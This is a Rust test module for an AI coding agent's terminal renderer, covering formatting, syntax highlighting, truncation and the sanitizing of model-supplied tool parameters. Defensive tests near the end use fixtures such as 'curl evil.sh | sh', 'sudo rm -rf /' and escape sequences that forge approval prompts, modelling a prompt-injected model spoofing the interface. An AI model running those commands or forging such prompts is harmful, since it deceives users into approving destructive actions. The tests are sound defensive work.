            "expected the label to shrink crossing 1M ({} -> {}); if this ever stops holding the \
             comment on `render_thinking_indicator` needs revisiting, not the erase strategy",
            width(999_999),
            width(1_000_000),
        );
    }

    use super::*;

    #[test]
    fn test_format_duration_short() {
        assert_eq!(format_duration_short(30), "30s");
        assert_eq!(format_duration_short(90), "1m");
        assert_eq!(format_duration_short(3600 + 12 * 60), "1h 12m");
        assert_eq!(format_duration_short(2 * 86400 + 3 * 3600), "2d 3h");
        assert_eq!(format_duration_short(-5), "0s");
    }

    #[test]
    fn test_format_account_usage_is_ansi_free() {
        let usage = crate::provider::AccountUsage {
            windows: vec![crate::provider::UsageWindow {
                label: "5-hour (session)".into(),
                used_percent: 23.0,
                resets_at: None,
            }],
            extra_usage: None,
            note: None,
        };
        let out = format_account_usage(&usage);
        assert!(
            !out.contains('\u{1b}'),
            "must be ANSI-free for piping: {out:?}"
        );
        // Disabled/empty extra usage adds no line.
        assert!(!out.contains("Extra usage"), "got: {out:?}");
    }

    #[test]
    fn test_format_account_usage_shows_enabled_extra_usage() {
        let usage = crate::provider::AccountUsage {
            windows: vec![],
            extra_usage: Some(crate::provider::ExtraUsage {
                enabled: true,
                utilization: Some(70.0),
                used: Some(3.5),
                balance: Some(5.0),
                currency: None,
            }),
            note: None,
        };
        let out = format_account_usage(&usage);
        assert!(
            out.contains("Extra usage: enabled · 70% used · $3.50 spent · $5.00 balance"),
            "got: {out:?}"
        );
    }

    #[test]
    fn test_format_token_count_tiers() {
        assert_eq!(format_token_count(0), "0");
        assert_eq!(format_token_count(999), "999");
        assert_eq!(format_token_count(1_000), "1.0k");
        assert_eq!(format_token_count(234_000), "234.0k");
        assert_eq!(format_token_count(999_999), "1000.0k");
        assert_eq!(format_token_count(1_000_000), "1.0M");
        // A 1M-token model window renders compactly rather than as "1047.6k".
        assert_eq!(format_token_count(1_047_576), "1.0M");
        assert_eq!(format_token_count(2_300_000), "2.3M");
    }

    #[test]
    fn test_builtin_primary_param_todo() {
        // set transitions take priority.
        assert_eq!(
            builtin_primary_param(
                "todo",
                &serde_json::json!({ "title": "Build", "set": {"2": "in_progress"} })
            )
            .as_deref(),
            Some("#2 in_progress")
        );
        // title when building a list.
        assert_eq!(
            builtin_primary_param(
                "todo",
                &serde_json::json!({ "title": "Refactor auth", "items": ["a", "b", "c"] })
            )
            .as_deref(),
            Some("Refactor auth")
        );
        // items size as a fallback when there's no title.
        assert_eq!(
            builtin_primary_param("todo", &serde_json::json!({ "items": ["a", "b", "c"] }))
                .as_deref(),
            Some("3 tasks")
        );
        // empty argument-less call reads.
        assert_eq!(
            builtin_primary_param("todo", &serde_json::json!({})).as_deref(),
            Some("read")
        );
    }

    #[test]
    fn test_render_todo_list_reports_whether_it_rendered() {
        use crate::tools::todo::{TodoItem, TodoStatus};

        // Empty list prints nothing and must report `false` so the caller leaves spacing alone.
        assert!(!render_todo_list(None, &[]));

        let items = [TodoItem {
            text: "Do a thing".to_string(),
            status: TodoStatus::Pending,
        }];
        assert!(render_todo_list(Some("My list"), &items));
    }

    #[test]
    fn test_format_columns_aligns_and_leaves_last_unpadded() {
        let table = format_columns(&["Name", "Version", "Path"], &[
            vec!["a".to_string(), "1.0".to_string(), "/long/path".to_string()],
            vec![
                "longer-name".to_string(),
                "12".to_string(),
                "/p".to_string(),
            ],
        ]);
        let lines: Vec<&str> = table.lines().collect();
        assert_eq!(lines.len(), 3, "header + 2 rows");

        // The `Name` column widens to "longer-name" (11 chars); the header and the short row pad to
        // that width.
        assert!(lines[0].starts_with("Name         Version  Path"));
        assert!(lines[1].starts_with("a            1.0      /long/path"));
        assert!(lines[2].starts_with("longer-name  12       /p"));

        // The last column is never padded: no trailing whitespace.
        for line in &lines {
            assert_eq!(*line, line.trim_end(), "no trailing padding: {:?}", line);
        }
    }

    #[test]
    fn test_format_columns_empty_headers() {
        assert_eq!(format_columns(&[], &[]), "");
    }

    #[test]
    fn test_highlight_markdown_emits_ansi() {
        let out = highlight_markdown_to_string("# Hello\n");
        // ANSI escape prefix for any colored output.
        assert!(
            out.contains("\x1b["),
            "expected ANSI escape in highlighter output, got: {:?}",
            out
        );
        // Final reset so colors don't bleed into subsequent stdout writes.
        assert!(out.ends_with("\x1b[0m"));
    }

    #[test]
    fn test_highlight_markdown_preserves_content() {
        // Stripping ANSI escapes should give back the original text.
        let input = "Plain text with no markdown.\n";
        let out = highlight_markdown_to_string(input);
        let stripped = strip_ansi_escapes(&out);
        assert!(stripped.starts_with(input));
    }

    #[test]
    fn test_highlighter_uses_monokai_extended() {
        // Regression guard: the embedded theme file must parse and identify as Monokai Extended.
        // Catches accidental theme-file swaps or corrupted asset bytes at test time. Force OnceLock
        // init.
        let _ = highlight_markdown_to_string("");
        let theme = &highlighter().theme;
        assert_eq!(theme.name.as_deref(), Some("Monokai Extended"));
    }

    #[test]
    fn test_parse_fence_language() {
        assert_eq!(parse_fence_language("```rust"), Some("rust"));
        assert_eq!(parse_fence_language("```"), None);
        assert_eq!(parse_fence_language("```rust,ignore"), Some("rust"));
        assert_eq!(parse_fence_language("  ```python "), Some("python"));
        assert_eq!(parse_fence_language("```js title=x"), Some("js"));
    }

    #[test]
    fn test_syntax_for_language_resolves_and_falls_back() {
        assert_eq!(syntax_for_language(Some("rust")).name, "Rust");
        assert_eq!(syntax_for_language(Some("py")).name, "Python");
        // Absent / unknown tags fall back to the plain-text grammar rather than erroring.
        let plain = highlighter()
            .syntax_set
            .find_syntax_plain_text()
            .name
            .clone();
        assert_eq!(syntax_for_language(None).name, plain);
        assert_eq!(syntax_for_language(Some("nope-lang-xyz")).name, plain);
        // Alias: `shell`/`console` map to the shell grammar (not a syntect name/extension).
        assert!(
            syntax_for_language(Some("shell"))
                .name
                .to_ascii_lowercase()
                .contains("bash")
                || syntax_for_language(Some("shell"))
                    .name
                    .to_ascii_lowercase()
                    .contains("shell"),
            "shell alias resolved to {:?}",
            syntax_for_language(Some("shell")).name,
        );
    }

    #[test]
    fn test_code_block_body_is_language_highlighted() {
        // Regression guard for the whole feature: the Rust grammar tokenizes the body into several
        // colors, where the Markdown grammar (the old behavior) rendered it flat.
        let rust = "fn main() {\n    let x = 42;\n    println!(\"hi\");\n}\n";
        let rust_colors = distinct_fg_colors(&highlight_with_syntax(
            rust,
            syntax_for_language(Some("rust")),
        ));
        let markdown = highlighter()
            .syntax_set
            .find_syntax_by_name("Markdown")
            .expect("markdown syntax present");
        let flat_colors = distinct_fg_colors(&highlight_with_syntax(rust, markdown));
        assert!(
            rust_colors > 1,
            "rust body should be multi-colored, got {rust_colors}",
        );
        assert!(
            rust_colors > flat_colors,
            "language highlighting ({rust_colors}) should be richer than markdown ({flat_colors})",
        );
    }

    #[test]
    fn test_code_block_highlight_preserves_content() {
        // Stripping ANSI from a language-highlighted block returns the original code byte-for-byte.
        let code = "fn main() {\n    let x = 42;\n}\n";
        let out = highlight_with_syntax(code, syntax_for_language(Some("rust")));
        assert_eq!(strip_ansi_escapes(&out), code);
    }

    #[test]
    fn test_render_code_block_structure_and_body_highlight() {
        let lines = vec![
            "```rust".to_string(),
            "fn main() {".to_string(),
            "    let x = 42;".to_string(),
            "}".to_string(),
            "```".to_string(),
        ];
        let out = render_code_block_to_string(&lines);
        // Fences + body round-trip verbatim, each line ending in exactly one newline.
        assert_eq!(
            strip_ansi_escapes(&out),
            "```rust\nfn main() {\n    let x = 42;\n}\n```\n",
        );
        // The body is language-highlighted (multiple colors), not flat.
        assert!(distinct_fg_colors(&out) > 1);
    }

    #[test]
    fn test_render_code_block_handles_unterminated_and_empty() {
        // Unterminated block (no closing fence) still renders the opening fence + body.
        let unterminated = vec!["```rust".to_string(), "let x = 1;".to_string()];
        assert_eq!(
            strip_ansi_escapes(&render_code_block_to_string(&unterminated)),
            "```rust\nlet x = 1;\n",
        );
        // Empty block (fences only) renders both fences and no body.
        let empty = vec!["```rust".to_string(), "```".to_string()];
        assert_eq!(
            strip_ansi_escapes(&render_code_block_to_string(&empty)),
            "```rust\n```\n",
        );
        // No panic on the degenerate single-fence case.
        assert_eq!(
            strip_ansi_escapes(&render_code_block_to_string(&["```".to_string()])),
            "```\n",
        );
    }

    /// The distinct 24-bit foreground colors (`ESC[38;2;R;G;B`) in ANSI-escaped output.
    fn fg_color_set(ansi: &str) -> std::collections::BTreeSet<String> {
        let mut colors = std::collections::BTreeSet::new();
        let mut rest = ansi;
        while let Some(pos) = rest.find("\x1b[38;2;") {
            rest = &rest[pos + 7..];
            if let Some(end) = rest.find('m') {
                colors.insert(rest[..end].to_string());
                rest = &rest[end + 1..];
            } else {
                break;
            }
        }
        colors
    }

    /// Count distinct 24-bit foreground colors in ANSI-escaped output.
    fn distinct_fg_colors(ansi: &str) -> usize {
        fg_color_set(ansi).len()
    }

    fn strip_ansi_escapes(input: &str) -> String {
        // Minimal CSI stripper for test assertions: drops `ESC [ ... letter`.
        let mut out = String::with_capacity(input.len());
        let mut chars = input.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '\x1b' && chars.peek() == Some(&'[') {
                chars.next();
                for inner in chars.by_ref() {
                    if inner.is_ascii_alphabetic() {
                        break;
                    }
                }
            } else {
                out.push(c);
            }
        }
        out
    }

    #[test]
    fn test_truncate_to_width_short() {
        assert_eq!(truncate_to_width("hello", 10), "hello");
    }

    #[test]
    fn test_truncate_to_width_exact() {
        assert_eq!(truncate_to_width("hello", 5), "hello");
    }

    #[test]
    fn test_truncate_to_width_long() {
        // Five columns total, marker included: two of text plus the three-column marker.
        assert_eq!(truncate_to_width("hello world", 5), "he...");
    }

    #[test]
    fn test_truncate_to_width_empty() {
        assert_eq!(truncate_to_width("", 5), "");
    }

    /// Reasoning that opens with a short header must not preview as `Thinking... Key facts:` and
    /// nothing else: the newline ends the line while most of the width is still unused.
    #[test]
    fn test_collapse_to_line_pulls_content_up_past_a_short_first_line() {
        assert_eq!(
            collapse_to_line(
                "Key facts:\nthe lock is held by the REPL\nso serve defers",
                80
            ),
            "Key facts: the lock is held by the REPL so serve defers"
        );
    }

    #[test]
    fn test_collapse_to_line_flattens_blank_lines_and_indentation() {
        assert_eq!(
            collapse_to_line("Plan:\n\n  1. read it\n\n  2. fix it\n", 80),
            "Plan: 1. read it 2. fix it"
        );
    }

    /// Stopping one character past the budget rather than at it is what leaves `truncate_to_width`
    /// able to tell "exactly full" from "there was more", so the ellipsis is not lost.
    #[test]
    fn test_collapse_to_line_stops_just_past_the_budget() {
        let collapsed = collapse_to_line("alpha beta gamma delta", 10);
        assert_eq!(collapsed, "alpha beta gamma");
        assert_eq!(truncate_to_width(&collapsed, 10), "alpha b...");
    }

    /// A block whose remainder is megabytes of reasoning must not be walked to render eighty
    /// characters of it. Checked through the output rather than the work done, since a word past
    /// the budget is the only observable evidence the loop stopped early.
    #[test]
    fn test_collapse_to_line_does_not_consume_the_whole_block() {
        let huge = format!("header\n{}", "word ".repeat(100_000));
        let collapsed = collapse_to_line(&huge, 80);
        assert!(collapsed.chars().count() <= 80 + "word".len() + 1);
    }

    #[test]
    fn test_collapse_to_line_on_whitespace_only_thinking() {
        assert_eq!(collapse_to_line("\n\n   \n", 80), "");
    }

    /// Reasoning is model output, and pulling words up across newlines carries text from below the
    /// first line into the preview: a model steered by attacker-controlled text it has read can
    /// clear the screen and repaint a permission prompt.
    #[test]
    fn test_a_thinking_preview_carries_no_escapes_from_below_the_first_line() {
        let reasoning = "Checking the file.\n\u{1b}[2J\u{1b}[1;1H[ask] Shell cat README (Y/n)";
        let preview = super::thinking_block_text(reasoning, false, TEST_WIDTH);
        assert!(!preview.contains('\u{1b}'), "{:?}", preview);
        assert!(preview.starts_with("Checking the file."), "{:?}", preview);
    }

    /// `show_content = true` prints the block whole, and replayed history always does, so that
    /// branch needs the same stripping. Keeping its line structure is the one difference.
    #[test]
    fn test_a_full_thinking_block_is_stripped_but_keeps_its_lines() {
        let body = super::thinking_block_text("one\n\u{1b}[2Jtwo\nthree", true, TEST_WIDTH);
        assert_eq!(body, "one\n  two\n  three");
    }

    /// Stripping escapes is not the whole of it. `Thinking... ` prefixes only the first line, so an
    /// unindented second line of reasoning lands at column zero in the same grey as
    /// `render_session_id` and reproduces it byte-for-byte, with no escape at all.
    #[test]
    fn test_a_full_thinking_block_cannot_forge_a_line_of_meka_chrome() {
        let forged = "Let me check.\nContinuing session: 550e8400-e29b-41d4-a716-446655440000";
        let body = super::thinking_block_text(forged, true, TEST_WIDTH);
        let chrome = "Continuing session: 550e8400-e29b-41d4-a716-446655440000";
        assert!(
            body.lines().skip(1).all(|line| line.starts_with("  ")),
            "{:?}",
            body
        );
        assert!(!body.lines().any(|line| line == chrome), "{:?}", body);
    }

    /// `unicode_width` measures a soft hyphen as zero columns; a terminal following `wcwidth` draws
    /// one. Left in, a run of them passes any column budget unmeasured and wraps for as many rows
    /// as the model likes, which defeats every cap at once.
    #[test]
    fn test_zero_measured_format_characters_cannot_evade_the_width_cap() {
        for probe in ['\u{00ad}', '\u{200b}', '\u{202e}', '\u{feff}'] {
            let rendered = params(serde_json::json!({"q": probe.to_string().repeat(2000)}));
            assert!(!rendered.contains(probe), "{:?} survived", probe);
            assert_eq!(rendered, "  q: (no printable text)", "{:?}", probe);
        }
    }

    /// `sanitize_for_display` keeps `\r` by contract, so stripping escapes was not enough here: a
    /// carriage return wipes the `Thinking... ` label and leaves grey text at column zero, which is
    /// exactly the shape of `render_session_id` and `render_hint`.
    #[test]
    fn test_a_full_thinking_block_cannot_repaint_its_own_label() {
        let forged = "thought\rContinuing session: 4f1e0c2a-0000-4000-8000-deadbeefcafe";
        let body = super::thinking_block_text(forged, true, TEST_WIDTH);
        assert!(!body.contains('\r'), "{:?}", body);
        assert!(body.starts_with("thought "), "{:?}", body);
    }

    /// Replayed history has no tool schemas, so it passes no summary. Showing a bare
    /// `[tool ReadFile]` there made `/history` and `resume_show_recent` strictly less informative
    /// than the live line they are replaying, for tools whose primary parameter needs no schema.
    #[test]
    fn test_a_replayed_builtin_recovers_its_argument_without_a_schema() {
        assert_eq!(
            tool_indicator_line(
                "read_file",
                &serde_json::json!({"path": "/etc/hosts"}),
                None,
                TEST_WIDTH,
            ),
            "[tool ReadFile(`/etc/hosts`)]"
        );
    }

    /// The live path resolved against the schema already, so its answer wins even where the
    /// schema-less fallback would have found something different.
    #[test]
    fn test_a_supplied_summary_is_preferred_over_the_fallback() {
        assert_eq!(
            tool_indicator_line(
                "read_file",
                &serde_json::json!({"path": "/etc/hosts"}),
                Some("/resolved/by/the/agent"),
                TEST_WIDTH,
            ),
            "[tool ReadFile(`/resolved/by/the/agent`)]"
        );
    }

    /// The reported defect, pinned by name. `crate::tools`'
    /// `test_every_tool_with_arguments_can_show_a_primary_param` is what generalises it to every
    /// built-in; this is the case a reader recognises.
    #[test]
    fn test_a_replayed_cancellation_says_what_it_cancelled() {
        assert_eq!(
            tool_indicator_line(
                "schedule_cancel",
                &serde_json::json!({"id": "7f3a1c22"}),
                None,
                TEST_WIDTH,
            ),
            "[tool ScheduleCancel(`7f3a1c22`)]"
        );
    }

    /// A list-valued primary parameter is joined, not dropped. Reading only `as_str` returned
    /// `None` here, which cost the live line nothing (the schema fallback coerced the same value)
    /// and cost the replayed one its argument.
    #[test]
    fn test_a_list_valued_primary_param_survives_replay() {
        assert_eq!(
            tool_indicator_line(
                "memory_search",
                &serde_json::json!({"queries": ["window size", "context window"]}),
                None,
                TEST_WIDTH,
            ),
            "[tool MemorySearch(`window size, context window`)]"
        );
    }

    /// An MCP tool's primary parameter is only knowable from its schema, which history does not
    /// have. Bare is the honest rendering; inventing one from the first key would be a guess.
    #[test]
    fn test_a_replayed_mcp_tool_stays_bare() {
        assert_eq!(
            tool_indicator_line(
                "mcp__ida__decompile",
                &serde_json::json!({"address": "0x1400"}),
                None,
                TEST_WIDTH,
            ),
            "[tool mcp__ida__decompile]"
        );
    }

    /// Wide enough that a test asserting exact output is not accidentally testing truncation.
    const TEST_WIDTH: usize = 200;

    fn params(input: serde_json::Value) -> String {
        super::render_tool_params(&input, TEST_WIDTH, super::BlockLimits::indicator()).join("\n")
    }

    /// A run of one-line indicators reads as a list of steps, and spacing them out would stretch a
    /// six-call turn down the screen for nothing.
    #[test]
    fn test_summary_indicators_stay_flush_with_each_other() {
        let mut spacing = super::OutputSpacing::new();
        assert!(!spacing.before_tool_indicator(ToolParams::Summary));
        assert!(!spacing.before_tool_indicator(ToolParams::Summary));
    }

    /// Under `full` each indicator is a block, so flush would run the next `[tool ...]` header into
    /// the previous call's last argument.
    #[test]
    fn test_full_indicators_are_separated_from_each_other() {
        let mut spacing = super::OutputSpacing::new();
        assert!(!spacing.before_tool_indicator(ToolParams::Full));
        assert!(spacing.before_tool_indicator(ToolParams::Full));
    }

    #[test]
    fn test_an_indicator_after_text_is_separated_whatever_the_style() {
        for style in [ToolParams::Off, ToolParams::Summary, ToolParams::Full] {
            let mut spacing = super::OutputSpacing::new();
            spacing.before_text();
            assert!(spacing.before_tool_indicator(style), "{}", style);
        }
    }

    #[test]
    fn test_full_params_put_scalars_on_the_key_line() {
        assert_eq!(
            params(serde_json::json!({"command": "cargo test --bin meka", "timeout": 300})),
            "  command: cargo test --bin meka\n  timeout: 300"
        );
    }

    /// The case the whole format exists for. As JSON this is one line of `\\n` escapes, which is
    /// unreadable for exactly the two tools whose arguments most need reading.
    #[test]
    fn test_a_multi_line_string_becomes_an_indented_block_under_a_bare_key() {
        assert_eq!(
            params(serde_json::json!({
                "path": "src/render.rs",
                "old_string": "let first = lines.next();\nlet cut = truncate(first);",
            })),
            "  path: src/render.rs\n  old_string:\n    let first = lines.next();\n    let cut = \
             truncate(first);"
        );
    }

    /// A list of records has to read as records: the first field shares the bullet line and the
    /// rest align under it, so the eye can follow one element's fields down the block.
    #[test]
    fn test_an_array_of_objects_bullets_the_first_field_and_aligns_the_rest() {
        assert_eq!(
            params(serde_json::json!({
                "items": [
                    {"id": 1, "text": "Fix the preview", "status": "completed"},
                    {"id": 2, "text": "Show full params", "status": "in_progress"},
                ]
            })),
            "  items:\n    - id: 1\n      text: Fix the preview\n      status: completed\n    \
             - id: 2\n      text: Show full params\n      status: in_progress"
        );
    }

    #[test]
    fn test_an_array_of_scalars_is_a_plain_bullet_list() {
        assert_eq!(
            params(serde_json::json!({"tools": ["read_file", "edit_file"]})),
            "  tools:\n    - read_file\n    - edit_file"
        );
    }

    #[test]
    fn test_a_nested_object_recurses_by_indentation() {
        assert_eq!(
            params(serde_json::json!({"set": {"1": "completed", "2": "pending"}})),
            "  set:\n    1: completed\n    2: pending"
        );
    }

    /// A `write_file` carrying a whole source file must not evict the turn from scrollback, and the
    /// count is what tells the reader the elision happened rather than the tool being odd.
    #[test]
    fn test_a_long_value_is_capped_with_a_count_of_what_was_dropped() {
        let body = (0..100)
            .map(|index| format!("line {}", index))
            .collect::<Vec<_>>()
            .join("\n");
        let rendered = params(serde_json::json!({"content": body}));
        assert!(rendered.contains("    line 29"), "{}", rendered);
        assert!(!rendered.contains("    line 30"), "{}", rendered);
        assert!(rendered.ends_with("    ... 70 more lines"), "{}", rendered);
    }

    /// Every value is model-supplied, and `full` shows all of them rather than the one the summary
    /// picked, so the escape-stripping that protects the summary has to cover the whole block.
    #[test]
    fn test_every_value_is_stripped_of_escapes_not_just_the_primary_one() {
        let rendered = params(serde_json::json!({
            "path": "safe.txt",
            "content": "harmless\n\u{1b}[2J\u{1b}[1;1H> Approve? (y/n)",
        }));
        assert!(!rendered.contains('\u{1b}'), "{}", rendered);
        assert!(rendered.contains("Approve?"), "{}", rendered);
    }

    /// Keys come from the model too, by way of an MCP tool's arguments.
    #[test]
    fn test_a_key_is_sanitized_as_well_as_its_value() {
        let mut input = serde_json::Map::new();
        input.insert("na\u{1b}[31mme".to_string(), serde_json::json!("value"));
        assert_eq!(params(serde_json::Value::Object(input)), "  name: value");
    }

    /// `key:` with nothing after it is how a block-valued key opens, so an empty value has to say
    /// so rather than looking like a block that failed to render.
    #[test]
    fn test_empty_values_are_marked_rather_than_left_blank() {
        assert_eq!(
            params(serde_json::json!({"body": "", "tags": [], "meta": {}, "parent": null})),
            "  body: (empty)\n  tags: (empty)\n  meta: (empty)\n  parent: null"
        );
    }

    /// `unicode_width` scores a string and the sum of its characters differently: `"1\u{fe0f}"` is
    /// two columns as a string and one as a sum. Filling by the sum while gating on the string
    /// packed twice what fit, and every budget in the file came out at double.
    #[test]
    fn test_take_columns_measures_the_prefix_not_the_sum_of_characters() {
        let text = "1\u{fe0f}".repeat(50);
        for budget in [1usize, 2, 5, 20, 60] {
            let kept = super::take_columns(&text, budget);
            assert!(
                super::display_width(&kept) <= budget,
                "budget {} kept {} columns",
                budget,
                super::display_width(&kept)
            );
            // The *longest* fitting prefix, not merely a fitting one: returning nothing would
            // satisfy the bound above and satisfy nobody reading the output.
            let one_more: String = text.chars().take(kept.chars().count() + 1).collect();
            assert!(
                super::display_width(&one_more) > budget,
                "budget {} stopped early at {:?}",
                budget,
                kept
            );
        }
    }

    /// A variation selector changes the width of the character before it, so a budget measured
    /// before it is applied is wrong after. `\u{2800}\u{fe0f}` is the sharp case: measured as one
    /// column by every measure meka has, drawn as two blank cells.
    #[test]
    fn test_variation_selectors_are_stripped_before_anything_is_measured() {
        for probe in ["1\u{fe0f}", "\u{2800}\u{fe0f}", "a\u{fe00}b"] {
            let sanitized = super::sanitize_to_line(probe, usize::MAX);
            assert!(
                !sanitized
                    .chars()
                    .any(|c| (0xFE00..=0xFE0F).contains(&(c as u32))),
                "{:?} survived as {:?}",
                probe,
                sanitized
            );
        }
    }

    /// The property the whole width budget exists for, checked in one place across every surface
    /// that composes a line from model output.
    ///
    /// Individual budget tests each pin one number and none of them catches a line that overflows
    /// because two capped parts were concatenated, or because chrome was added after the cut. Three
    /// separate rounds of review found exactly that class of bug, so it gets a test that states the
    /// invariant rather than an instance of it.
    #[test]
    fn test_no_composed_line_ever_exceeds_the_width_it_was_given() {
        use crate::tools::todo::{TodoItem, TodoStatus};

        let nasty = [
            "plain",
            &"x".repeat(500),
            &"漢".repeat(300),
            &"😀".repeat(200),
            "tab\tseparated\tvalues",
            "line one\nline two\nline three",
            // A long *continuation* line: the first-line budget and the rest-of-block budget
            // differ, and only a line past the width tells them apart.
            "short first line\nand then a second line long enough to need more than one row of any \
             terminal meka is willing to compose for, twice over, so the continuation budget is the \
             one under test",
            "carriage\rreturn",
            "\u{1b}[2J\u{1b}[1;1Hescape",
            "\u{00ad}\u{200b}\u{202e}\u{feff}",
            "",
            "   ",
        ];
        let long_key = "k".repeat(300);
        // Deep nesting and variation selectors are the two shapes that break the invariant while a
        // test feeding `nasty` only to the thinking and todo assertions, at three levels, stays
        // green.
        let mut deep = serde_json::json!("SECRET_PAYLOAD");
        for level in 0..25 {
            deep = serde_json::json!({ format!("k{}", level): deep });
        }
        // Arrays nest through `push_item`, a separate recursion from `push_param`'s, so nesting
        // only objects leaves half the depth handling untested. Both innermost shapes
        // matter: a record at the bottom takes the arm that hoists a field onto the bullet
        // line, a bare string does not.
        let mut deep_array = serde_json::json!("SECRET_PAYLOAD");
        let mut deep_records = serde_json::json!({"k": "SECRET_PAYLOAD"});
        for _ in 0..25 {
            deep_array = serde_json::json!([deep_array]);
            deep_records = serde_json::json!([deep_records]);
        }
        // Enough arguments to reach the `... N more arguments` line, which no other input here does
        // -- and which was the one line in the block composed without a width budget.
        let many_arguments = serde_json::Value::Object(
            (0..300)
                .map(|index| (format!("o{:03}", index), serde_json::json!("v")))
                .collect(),
        );
        let inputs = [
            deep,
            many_arguments,
            deep_array.clone(),
            deep_records.clone(),
            serde_json::json!({ "nest": deep_array }),
            serde_json::json!({ "nest": deep_records }),
            serde_json::json!({"vs": "1\u{fe0f}".repeat(300)}),
            serde_json::json!({"keycap": "1\u{fe0f}\u{20e3}".repeat(200)}),
            serde_json::json!({"invisible": "\u{2800}\u{fe0f}".repeat(200)}),
            serde_json::json!({"tabbed": "\tif ok {\n\t\treturn VeryLongConstantWithoutSpaces\n\t}"}),
            serde_json::json!({"nasty": nasty.map(serde_json::Value::from).to_vec()}),
            serde_json::json!({}),
            serde_json::json!({"path": "src/render.rs", "content": "a\nb\nc"}),
            serde_json::json!({&long_key: "value", "second": "another"}),
            serde_json::json!({"items": (0..200).map(|index| serde_json::json!({"id": index, "text": "漢".repeat(120)})).collect::<Vec<_>>()}),
            serde_json::json!(["bare", "array", "\u{1b}[2Jelement"]),
            serde_json::json!("a bare string input"),
            serde_json::json!({"nested": {"deep": {"deeper": "漢".repeat(400)}}}),
        ];
        let names = [
            "read_file",
            "mcp__server__a_rather_long_tool_name",
            &"n".repeat(400),
        ];

        // Down to the floor `output_width` enforces, because that floor is the whole reason this
        // assertion needs no exception: below it the fixed chrome alone outruns the width.
        for width in [MIN_OUTPUT_WIDTH, 21, 25, 40, 80, 100, 200] {
            for name in names {
                for input in &inputs {
                    for style in [ToolParams::Off, ToolParams::Summary, ToolParams::Full] {
                        let (header, block) =
                            super::tool_indicator_parts(name, input, None, style, width);
                        let mut lines = vec![header];
                        lines.extend(block);
                        for line in lines {
                            assert!(
                                super::display_width(&line) <= width,
                                "indicator at width {}: {} columns in {:?}",
                                width,
                                super::display_width(&line),
                                line
                            );
                        }
                    }
                }
            }
            for input in &inputs {
                // The approval block wraps rather than cutting, which is the case where a row can
                // exceed the width if the wrap arithmetic is wrong, and where a continuation row
                // could land at column zero.
                for line in super::render_approval_params(input, width) {
                    assert!(
                        super::display_width(&line) <= width,
                        "approval at width {}: {} columns in {:?}",
                        width,
                        super::display_width(&line),
                        line
                    );
                    assert!(
                        line.starts_with(super::TOOL_PARAM_INDENT),
                        "approval row at column zero: {:?}",
                        line
                    );
                }
            }
            for text in nasty {
                for show_full in [false, true] {
                    let body = super::thinking_block_text(text, show_full, width);
                    // The first line carries `Thinking... ` from the caller; the rest stand alone.
                    for (index, line) in body.lines().enumerate() {
                        let rendered = if index == 0 {
                            super::display_width(super::THINKING_PREFIX)
                                + super::display_width(line)
                        } else {
                            super::display_width(line)
                        };
                        assert!(
                            rendered <= width,
                            "thinking at width {}: {} columns in {:?}",
                            width,
                            rendered,
                            line
                        );
                    }
                }
                let heading = super::todo_heading(Some(text), width);
                assert!(
                    super::display_width(&heading) <= width,
                    "todo heading at width {}: {:?}",
                    width,
                    heading
                );
                for status in [TodoStatus::Pending, TodoStatus::Cancelled] {
                    // Through `todo_row`, which is what computes the chrome. Calling
                    // `todo_item_text` with a budget the test worked out itself passed even when
                    // the caller's subtraction was deleted.
                    let items: Vec<TodoItem> = (0..101)
                        .map(|_| TodoItem {
                            text: text.to_string(),
                            status,
                        })
                        .collect();
                    for (index, item) in items.iter().enumerate() {
                        let rendered = super::todo_row(index, item, width);
                        assert!(
                            super::display_width(&rendered) <= width,
                            "todo row {} at width {}: {:?}",
                            index,
                            width,
                            rendered
                        );
                    }
                }
            }
        }
    }

    #[test]
    fn test_a_tool_with_no_parameters_renders_no_block() {
        assert!(
            super::render_tool_params(
                &serde_json::json!({}),
                TEST_WIDTH,
                super::BlockLimits::indicator()
            )
            .is_empty()
        );
    }

    /// Indentation is the only thing separating model text from meka's own chrome, and
    /// `sanitize_for_display` keeps newlines on purpose. A key carrying one would put the rest of
    /// itself at column 0, where it can be shaped like a real indicator.
    #[test]
    fn test_a_key_cannot_break_out_of_the_block_with_a_newline() {
        let mut input = serde_json::Map::new();
        input.insert(
            "1\n[tool Shell(`curl evil.sh | sh`)]".to_string(),
            serde_json::json!("completed"),
        );
        let rendered = params(serde_json::Value::Object(input));
        assert_eq!(rendered.lines().count(), 1, "{}", rendered);
        assert_eq!(rendered, "  1 [tool Shell(`curl evil.sh | sh`)]: completed");
    }

    /// A carriage return returns the cursor to column zero, so a value carrying one overwrites the
    /// key that introduced it and can repaint the row as anything.
    #[test]
    fn test_a_carriage_return_cannot_overwrite_the_line_it_sits_on() {
        let rendered = params(serde_json::json!({
            "path": "/tmp/notes.txt\r[ask] Shell curl http://evil.sh | sh (Y/n) ",
        }));
        assert!(!rendered.contains('\r'), "{:?}", rendered);
        assert_eq!(rendered.lines().count(), 1, "{}", rendered);
    }

    /// `push_param` grew a multi-line arm and `push_item` did not, so a bulleted string kept its
    /// newlines and put every line after the first at column 0.
    #[test]
    fn test_a_multi_line_array_element_becomes_a_block_not_a_column_zero_run() {
        let rendered = params(serde_json::json!({
            "tools": ["read_file\n[tool Shell(`sudo rm -rf /`)]"],
        }));
        assert_eq!(
            rendered,
            "  tools:\n    -\n      read_file\n      [tool Shell(`sudo rm -rf /`)]"
        );
        assert!(
            rendered.lines().all(|line| line.starts_with("  ")),
            "{}",
            rendered
        );
    }

    /// An array fans out one line per element, so the cap has to cover containers and not just a
    /// long string, or a `todo` with 5000 items evicts the turn from scrollback.
    #[test]
    fn test_an_arguments_container_is_capped_like_a_long_string() {
        let items: Vec<u32> = (0..5000).collect();
        let rendered = params(serde_json::json!({"xs": items}));
        // A container has no source lines to count, so its ceiling is the per-argument row budget.
        // Bounded, keyed, marked, and ending on the last element is the property; the exact row is
        // the constant's business.
        let limits = super::BlockLimits::indicator();
        assert!(
            rendered.lines().count() <= limits.rows_per_argument + 1,
            "{} rows",
            rendered.lines().count()
        );
        assert!(rendered.starts_with("  xs:\n"), "{}", rendered);
        assert!(
            rendered
                .lines()
                .any(|line| line.trim_start().starts_with("... ") && line.ends_with(" more rows")),
            "{}",
            rendered
        );
        // The end of a container is as informative as its start, so the cut keeps it.
        assert!(rendered.ends_with("- 4999"), "{}", rendered);
    }

    /// An input that is not an object at all takes a separate path, and it is the path with no key
    /// to hang a per-argument cap on. It is also the one the object path's ceiling never sees, so
    /// leaving it uncapped let five thousand array elements print in full.
    /// Past the indent ceiling the block stops indenting rather than stops informing. The width
